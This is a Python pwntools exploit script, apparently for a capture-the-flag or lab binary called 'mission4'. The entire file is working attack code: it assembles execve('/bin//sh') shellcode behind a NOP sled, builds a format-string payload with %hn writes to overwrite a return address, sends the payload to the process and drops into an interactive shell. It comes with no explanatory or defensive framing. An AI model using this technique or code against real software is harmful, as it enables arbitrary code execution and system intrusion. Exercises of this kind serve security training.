from pwn import *

# 7 answer
# 84 overwrite RET
# 32 shellcode
# 4 AAAA

shell = "nop\n" * 40

shell += """
xor eax, eax    # Setup the eax to call the sys_execve
push eax
push 0x68732f6e
push 0x69622f2f
inc eax         # 1
inc eax         # 2
inc eax         # 3
inc eax         # 4
inc eax         # 5
inc eax         # 6
inc eax         # 7
inc eax         # 8
inc eax         # 9
inc eax         # a
inc eax         # b
xor ecx, ecx    # set the param to NULL
xor edx, edx    # set the enviornm to NULL
mov ebx, esp
int 0x80
"""

shellcode = asm(shell)

print(disasm(shellcode))

print("[INFO] shellcode len: %d\n"%len(shellcode))

p = process("../mission4")

buffer_len = 127

exploit = str(4276545) + "A"	# result + pad for mutiple of 8 and number isolation

ret_address = 0xffffcabc  + 0x40

first = 0xffff
second = 0xca48 + 0x40

exploit += p32(ret_address)	# first 2 bytes
exploit += p32(ret_address + 2) # last 2 bytes

current_val = len(exploit)

exploit += "%" + str(second - current_val) + "c"
exploit += "%6$hn"

exploit += "%" + str(first - second) + "c"
exploit += "%7$hn"

exploit += shellcode


assert len(exploit) <= buffer_len - 4

exploit += "B" * (buffer_len - len(exploit)) # Fill the buffer if needed
exploit += "AAAA\n" # overwrite real result

print(exploit)
print(len(exploit))
with open("exploit.bin", "wb") as f:
	f.write(exploit)


p.send(exploit)

p.interactive()
